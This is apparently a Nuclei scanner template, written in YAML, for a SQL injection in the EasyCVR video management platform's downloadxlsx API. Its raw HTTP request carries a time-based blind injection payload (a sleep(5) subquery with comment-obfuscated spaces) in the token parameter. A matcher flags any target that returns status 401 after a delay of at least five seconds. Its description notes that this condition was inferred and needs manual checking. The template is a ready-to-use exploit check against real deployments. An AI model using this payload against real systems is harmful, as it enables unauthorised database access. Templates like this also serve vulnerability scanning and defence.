id: poc-vgcli1t2lq867qlk
info:
  name: EasyCVR视频管理平台 downloadxlsx 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'GET /api/v1/cascade/downloadxlsx?token=''and(select*from(select/**/sleep(5))a/**/union/**/select+1)='' HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (CentOS; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0

    Accept-Encoding: gzip

    Connection: keep-alive'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 401 && duration >= 5
    condition: and
